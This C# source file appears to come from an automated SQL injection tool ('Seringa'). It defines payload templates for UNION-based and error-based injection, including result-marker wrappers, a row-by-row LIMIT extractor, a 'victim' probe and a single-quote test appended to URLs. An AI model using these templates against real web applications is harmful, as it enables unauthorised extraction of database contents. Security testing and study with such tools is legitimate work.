using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Seringa.Engine.Static
{
    public class GeneralPayloads
    {
        public static string UnionBasedResultSeparator = "|||";
        public static string UnionBasedErrorMessage = "The used SELECT statements have a different number of columns";
        public static string UnionBasedSelectValue = "'<injres>{0}</injres>'";
        public static string UnionBasedSelectResultWrapper = "concat('<injres>',({0}),'</injres>')";
        public static string UnionBasedSelectCountedResultWrapper = "CONCAT('<injres>{0}" + UnionBasedResultSeparator + "',({1}),'</injres>')";
        public static string ErrorBasedVictimIdentifier = "SELECT 'victim'";
        public static string ErrorBasedVictimConfirmationResult = "victim";
        public static string QueryResultCount = "SELECT count(*) FROM ({0}) cq";
        public static string MysqlSingleResultLimiterQuery = "{0} LIMIT {1},1";
        public static string MssqlSingleResultLimiterQuery = "";
        public static string UrlVulnerabilityTestingAppendix = "'";
    }
}
